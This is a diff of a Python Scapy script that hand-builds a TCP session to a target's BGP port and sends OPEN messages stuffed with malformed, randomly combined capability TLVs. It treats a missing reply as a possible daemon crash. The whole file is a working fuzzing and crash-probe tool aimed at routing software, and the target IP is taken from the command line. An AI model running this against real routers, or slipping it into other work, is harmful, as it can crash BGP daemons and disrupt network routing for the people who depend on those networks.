@@ -5,21 +5,29 @@ import random
 import logging
 import time
 
-logging.basicConfig(filename='codex_tlv_fuzz.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+logging.basicConfig(filename='codex_tlv_cyclone.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
-def build_malformed_opt_params():
-    # Forge TLV: Type = 2 (Capabilities), Length = 10, but only 2 bytes of actual data
-    malformed_param = bytes([
-        2,   # Parameter Type: Capabilities
-        10,  # Length says 10 bytes
-        1,   # Capability Code (e.g., multiprotocol)
-        1,   # Capability Length
-        1    # Incomplete payload
-        # Missing remaining 5+ bytes!
-    ])
-    return malformed_param
+def build_varied_tlvs():
+    tlvs = []
 
-def send_tlv_crash_probe(dst_ip, dst_port=179):
+    # Valid TLV: Multiprotocol Capability (Type 1)
+    tlvs.append(bytes([2, 6, 1, 4, 0, 1, 0, 1]))
+
+    # Invalid TLV: Wrong capability code
+    tlvs.append(bytes([2, 3, 255, 1, 1]))
+
+    # TLV: Unknown type with long length
+    tlvs.append(bytes([127, 10] + [0x41]*10))
+
+    # TLV: Short length, too little data
+    tlvs.append(bytes([2, 5, 1, 4, 0]))
+
+    # TLV: Capabilities declared but only 1 byte
+    tlvs.append(bytes([2, 1, 1]))
+
+    return tlvs
+
+def send_multi_tlv_fuzz(dst_ip, dst_port=179):
     ip = IP(dst=dst_ip)
     src_port = RandShort()
 
@@ -34,31 +42,34 @@ def send_tlv_crash_probe(dst_ip, dst_port=179):
     ack = TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
     send(ip/ack, verbose=0)
 
-    # Build BGP OPEN with malformed optional parameter
-    malformed_opt_param = build_malformed_opt_params()
-    open_with_tlv = BGPHeader(type=1)/Raw(load=bytes([
-        4,                # version
-        0xFC, 0x00,       # my_as = 64512
-        0x00, 0x5A,       # hold_time = 90
-        1,2,3,4,          # BGP Identifier (fake)
-        len(malformed_opt_param)  # Total length of optional parameters
-    ]) + malformed_opt_param)
+    tlvs = build_varied_tlvs()
+    combined = b''.join(random.sample(tlvs, k=random.randint(2, len(tlvs))))
 
-    pkt = ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/open_with_tlv
-    print("[+] Sending malformed TLV BGP OPEN packet")
-    logging.info("Sending TLV crash test with malformed optional parameter.")
+    open_hdr = bytes([
+        4,                    # version
+        0xFC, 0x00,           # my_as = 64512
+        0x00, 0x5A,           # hold_time = 90
+        1, 2, 3, 4,           # BGP ID
+        len(combined)         # Total opt_param_len
+    ]) + combined
+
+    pkt = ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/BGPHeader(type=1)/Raw(load=open_hdr)
+    print(f"[+] Sending Multi-TLV combo: {len(combined)} bytes")
+    logging.info(f"Multi-TLV Packet (len={len(combined)}): {combined.hex()}")
 
     response = sr1(pkt, timeout=3, verbose=0)
     if response:
         print("[+] Response:", response.summary())
         logging.info(f"Response: {response.summary()}")
     else:
-        print("[!] No response — possible silent crash")
-        logging.info("No response — possible daemon failure or filter.")
+        print("[!] No response — possible crash or silent reject")
+        logging.info("No response received.")
+
+    time.sleep(1)
 
 if __name__ == "__main__":
     import sys
     if len(sys.argv) < 2:
-        print("Usage: sudo python3 codex_tlv_fuzz.py <target_ip>")
+        print("Usage: sudo python3 codex_tlv_cyclone.py <target_ip>")
         sys.exit(1)
-    send_tlv_crash_probe(sys.argv[1])
+    send_multi_tlv_fuzz(sys.argv[1])
